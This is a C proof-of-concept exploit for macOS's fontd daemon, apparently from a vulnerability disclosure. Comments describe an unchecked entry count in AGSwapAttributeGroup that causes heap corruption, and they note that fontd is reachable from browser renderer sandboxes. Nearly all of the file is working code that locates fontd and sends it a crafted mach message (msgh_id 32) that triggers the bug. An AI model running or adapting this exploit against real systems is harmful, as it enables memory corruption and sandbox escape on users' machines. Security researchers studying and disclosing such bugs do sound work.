//ianbeer

// The fontd messages handled by the OFAHandle{Strike, Stream, General}Message functions (msgh_id values 32, 31, 33) all
// use an OOL descriptor to pass a user-controlled buffer.
// If the uint32_t in the mach message body (after the descriptor) at offset +0x10 is 0 then the OFAHandle* functions will
// malloc a buffer to hold a copy of the OOL descriptor data, copy the OOL data into it then pass a pointer to that malloc'ed
// buffer to AGSwapAttributeGroup. This function then reads a uint32_t at offset 0xc from that buffer which corrisponds to the number
// of entries in the buffer. It never checks that this value is safe and uses it as a loop counter to swap the endianness
// of various parts of the buffer, leading to heap corruption.

// fontd is an unsandboxed daemon running as a regular user. It's reachable from various sandboxes including chrome and safari
// renderer processes.

#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>
#include <unistd.h>
#include <libproc.h>

pid_t find_process(char* executable){
  int name[] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
  size_t length = 0;
  int err;

  err = sysctl(name, 3, NULL, &length, NULL, 0);
  if(err){
    perror(NULL);
    exit(0);
  }

  struct kinfo_proc* proc_list = malloc(length+0x10000);
  err = sysctl(name, 3, proc_list, &length, NULL, 0);

  if(err){
    perror(NULL);
    exit(0);
  }

  int n_procs = length / sizeof(struct kinfo_proc);
  pid_t pid = 0;

  for(int i = 0; i < n_procs; i++){
    pid = proc_list[i].kp_proc.p_pid;

    char path[PROC_PIDPATHINFO_MAXSIZE];
    err = proc_pidpath(pid, path, sizeof(path));
    if(err <= 0){
      continue;
    }

    char* match = strstr(path, executable);
    if(match == NULL){
      continue;
    }

    if((match + strlen(executable)) == (path + strlen(path))){
      free(proc_list);
      return pid;
    }
  }

  free(proc_list);
  return 0; 
}

struct ofastrike_msg {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_descriptor_t ool_desc;
  char pad0[0xc];
  uint32_t server_pid2;  
  uint32_t is_le2;
  char pad[0x680];       // +0x40
  uint32_t client_pid;   // +0x6c0
  uint32_t server_pid;   // +0x6c4
  uint8_t is_le;         // +0x6c8 
};

uint32_t bswap_32(uint32_t v) {
  return (v << 24) | 
         (v & 0xff00) << 8 | 
         (v & 0xff0000) >> 8 |
         (v >> 24);
}

void send_ofastrike_msg(mach_port_t service_port) {
  kern_return_t err;

  struct ofastrike_msg m = {0};
  m.hdr.msgh_size = sizeof(struct ofastrike_msg);
  m.hdr.msgh_local_port = MACH_PORT_NULL;
  m.hdr.msgh_remote_port = service_port;
  m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
  m.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
  m.hdr.msgh_id = 32;
  
  m.body.msgh_descriptor_count = 1;

  uint8_t* buf = malloc(1024);
  memset(buf, 'D', 1024);

  m.ool_desc.type = MACH_MSG_OOL_DESCRIPTOR;
  m.ool_desc.address = buf;
  m.ool_desc.size = 1024;
  m.ool_desc.deallocate = 0;
  m.ool_desc.copy = MACH_MSG_VIRTUAL_COPY;

  m.client_pid = (uint32_t) getpid();
  m.server_pid = find_process("fontd");
  m.server_pid2 = bswap_32(m.server_pid);
  m.is_le = 1;
  m.is_le2 = 0; //let's get some byte-swapping writes

  err = mach_msg(&m.hdr,
                 MACH_SEND_MSG,
                 m.hdr.msgh_size,
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);

  if (err != KERN_SUCCESS) {
    printf(" [-] mach_msg failed with error code:%x\n", err);
    exit(EXIT_FAILURE);
  }
  printf(" [+] looks like that sent?\n");

}

mach_port_t mach_connect(char* service_name){
  kern_return_t err;
  
  mach_port_t bootstrap_port;
  err = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
  if (err != KERN_SUCCESS) {
    printf(" [-] couldn't get bootstrap port\n");
    exit(EXIT_FAILURE);
  }
  printf(" [+] got bootstrap port\n");

  mach_port_t service_port;
  err = bootstrap_look_up(bootstrap_port, service_name, &service_port);
  if (err != KERN_SUCCESS) {
    printf(" [-] unable to lookup service %s\n", service_name);
    exit(EXIT_FAILURE);
  }
  printf(" [+] got %s mach port\n", service_name);
  return service_port;
}

int main(int argc, char** argv){
  send_ofastrike_msg(mach_connect("com.apple.FontObjectsServer"));
  return EXIT_SUCCESS;
}

